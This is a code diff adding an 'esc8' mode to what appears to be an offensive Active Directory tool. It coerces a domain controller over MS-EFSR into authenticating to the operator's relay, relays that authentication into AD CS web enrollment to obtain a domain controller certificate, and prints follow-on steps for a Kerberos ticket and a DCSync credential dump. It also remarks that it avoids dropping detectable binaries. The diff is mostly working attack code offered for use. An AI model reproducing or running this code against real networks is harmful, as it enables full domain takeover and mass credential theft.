@@ -2104,6 +2104,127 @@ def _default_src_ip(target_hint=None):
     return None
 
 
+def _fire_coercion(dc, unc, domain, username, password, lmhash, nthash, timeout):
+    """Bind MS-EFSR on the DC and fire its UNC-taking methods with a path that
+    points at our relay, which makes the DC's machine account authenticate to
+    us. Returns True if a call went out. No listener here: the relay server is
+    what catches the auth."""
+    desc = COERCION_DB.get('c681d488-d850-11d0-8c52-00c04fd90f7e')  # MS-EFSR
+    if not desc:
+        return False
+    sent = False
+    for pipe in ('lsarpc', 'efsrpc'):
+        sb = r'ncacn_np:%s[\PIPE\%s]' % (dc, pipe)
+        try:
+            rpctransport = transport.DCERPCTransportFactory(sb)
+            rpctransport.set_connect_timeout(timeout)
+            if hasattr(rpctransport, 'set_credentials'):
+                rpctransport.set_credentials(username, password, domain,
+                                             lmhash or '', nthash or '')
+            dce = rpctransport.get_dce_rpc()
+            dce.connect()
+            dce.bind(uuidtup_to_bin(desc['uuidtup']))
+        except Exception:
+            continue
+        for method_name, arg_name, fire in desc['triggers']:
+            try:
+                fire(dce, unc, dc)
+                sent = True
+                print(c('[*] fired %s via \\PIPE\\%s' % (method_name, pipe),
+                        C.CYAN))
+            except Exception as e:
+                if any(code in str(e) for code in _EXPECTED_COERCE_ERRORS):
+                    sent = True
+                    print(c('[*] fired %s via \\PIPE\\%s (post-dial path error, '
+                            'reached out)' % (method_name, pipe), C.CYAN))
+        try:
+            dce.disconnect()
+        except Exception:
+            pass
+        if sent:
+            break
+    return sent
+
+
+def esc8_attack(dc, ca, template, domain, username, password, lmhash, nthash,
+                listener_ip, listener_port, timeout, loot_dir, wait):
+    """Relay a coerced DC machine account into the AD CS web enrollment on `ca`
+    to issue a certificate (ESC8). Runs from impacket library internals only, so
+    no signatured external binary is dropped. Returns the issued .pfx path or
+    None."""
+    import glob
+    import logging
+    logging.basicConfig(level=logging.INFO,
+                        format='%(asctime)s %(levelname)s %(message)s')
+    try:
+        from impacket.examples.ntlmrelayx.servers import SMBRelayServer
+        from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
+        from impacket.examples.ntlmrelayx.utils.targetsutils import \
+            TargetsProcessor
+        from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
+        from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
+    except Exception as e:
+        print(c('[-] impacket relay internals unavailable: %s' % e, C.BRED))
+        return None
+
+    ca_url = 'http://%s/certsrv/certfnsh.asp' % ca
+    before = set(glob.glob(os.path.join(loot_dir, '*.pfx')))
+
+    cfg = NTLMRelayxConfig()
+    cfg.setProtocolClients(PROTOCOL_CLIENTS)
+    cfg.setTargets(TargetsProcessor(singleTarget=ca_url,
+                                    protocolClients=PROTOCOL_CLIENTS))
+    cfg.setMode('RELAY')
+    cfg.setAttacks(PROTOCOL_ATTACKS)
+    cfg.setLootdir(loot_dir)
+    cfg.setOutputFile(None)
+    cfg.setEncoding(sys.getdefaultencoding())
+    cfg.setSMB2Support(True)
+    cfg.setIsADCSAttack(True)
+    cfg.setADCSOptions(template)
+    cfg.setInterfaceIp('0.0.0.0')
+    cfg.setListeningPort(listener_port)
+    cfg.setDisableMulti(True)
+
+    print(c('[*] ESC8: relay %s  ->  %s' % (dc, ca_url), C.BOLD + C.CYAN))
+    print(c('[*] template: %s   callback: %s:%d'
+            % (template, listener_ip, listener_port), C.CYAN))
+    try:
+        server = SMBRelayServer(cfg)
+        server.daemon = True
+        server.start()
+    except Exception as e:
+        print(c('[-] could not start the relay on :%d (%s). Is 445 free on this '
+                'box?' % (listener_port, e), C.BRED))
+        return None
+    time.sleep(1.0)
+
+    unc = '\\\\%s\\%s\\file' % (listener_ip, _rand_tag())
+    if not _fire_coercion(dc, unc, domain, username, password, lmhash, nthash,
+                          timeout):
+        print(c('[-] coercion did not fire; check creds and that the DC exposes '
+                'MS-EFSR.', C.YELLOW))
+
+    print(c('[*] waiting up to %ds for the certificate to be issued...' % wait,
+            C.CYAN))
+    deadline = time.time() + wait
+    while time.time() < deadline:
+        new = set(glob.glob(os.path.join(loot_dir, '*.pfx'))) - before
+        if new:
+            pfx = sorted(new)[0]
+            print(c('[+] CERTIFICATE ISSUED -> %s' % pfx, C.BOLD + C.GREEN))
+            print(c('    next: getTGT.py -cert-pfx %s %s/%s -dc-ip %s'
+                    % (pfx, domain or 'DOMAIN',
+                       os.path.splitext(os.path.basename(pfx))[0], dc), C.CYAN))
+            print(c('    then: set KRB5CCNAME and secretsdump.py -k -no-pass '
+                    'for the DCSync.', C.CYAN))
+            return pfx
+        time.sleep(1.0)
+    print(c('[-] no certificate within the window. Confirm the relay reached the '
+            'CA, the template name is valid, and the coercion landed.', C.YELLOW))
+    return None
+
+
 def main():
     global _NOCOLOR
     parser = argparse.ArgumentParser(
@@ -2138,6 +2259,13 @@ def main():
                              'omitted)')
     parser.add_argument('--dry-run', dest='dry_run', action='store_true',
                         help='coerce/hunt: show what WOULD fire, send nothing')
+    parser.add_argument('--ca', dest='ca', metavar='IP',
+                        help='esc8: AD CS web-enrollment host to relay into')
+    parser.add_argument('--template', dest='template', default='DomainController',
+                        help='esc8: certificate template (default DomainController; '
+                             'use Machine for a workstation, User for a user)')
+    parser.add_argument('--loot', dest='loot', metavar='DIR', default='.',
+                        help='esc8: where to write the issued .pfx (default .)')
     parser.add_argument('-o', '--output', help='append plain-text results to file')
     parser.add_argument('-v', '--verbose', action='store_true',
                         help='also print dead/no-RPC hosts and debug errors')
@@ -2173,7 +2301,8 @@ def main():
     _VALUE_OPTS = {'-H', '-hashes', '--hashes', '--listener-ip', '-o', '--output',
                    '-threads', '--threads', '-timeout', '--timeout',
                    '--listener-port', '--callback-wait', '--delay', '--jitter',
-                   '--max', '--candidates', '--rebuild'}
+                   '--max', '--candidates', '--rebuild', '--ca', '--template',
+                   '--loot'}
     _argv = list(sys.argv[1:])
     _mode = 'map'
     _skip = False
@@ -2187,7 +2316,7 @@ def main():
         if _tok.startswith('-'):
             continue
         # first positional token: it is the mode only if it is a mode word
-        if _tok in ('map', 'coerce', 'hunt'):
+        if _tok in ('map', 'coerce', 'hunt', 'esc8'):
             _mode = _tok
             _argv.pop(_i)
         break
@@ -2242,6 +2371,32 @@ def main():
     if password == '' and username != '' and options.hashes is None:
         from getpass import getpass
         password = getpass('Password:')
+
+    lmhash = nthash = ''
+    if options.hashes:
+        if ':' in options.hashes:
+            lmhash, nthash = options.hashes.split(':', 1)
+        else:
+            nthash = options.hashes
+
+    # esc8 is a single-target attack, not a sweep: relay a coerced DC machine
+    # account into the AD CS web enrollment to issue a certificate. It owns 445
+    # itself (the relay server is the listener), so it bypasses the normal
+    # sweep/listener path entirely.
+    if options.mode == 'esc8':
+        if not options.ca:
+            parser.error('esc8 needs --ca <ADCS-ip> (the host to relay into)')
+        dc = spec.split(',')[0]
+        lip = options.listener_ip or _default_src_ip(dc)
+        if not lip:
+            sys.stderr.write('[-] could not auto-detect your relay IP; pass '
+                             '--listener-ip.\n')
+            sys.exit(1)
+        pfx = esc8_attack(dc, options.ca, options.template, domain, username,
+                          password, lmhash, nthash, lip, options.listener_port,
+                          options.timeout, options.loot, options.coerce_timeout
+                          if options.coerce_timeout > 5 else 60)
+        sys.exit(0 if pfx else 2)
 
     # coerce/hunt need a callback IP; auto-detect it if the user did not give one.
     # A dry run fires nothing, so it needs no listener in either mode.
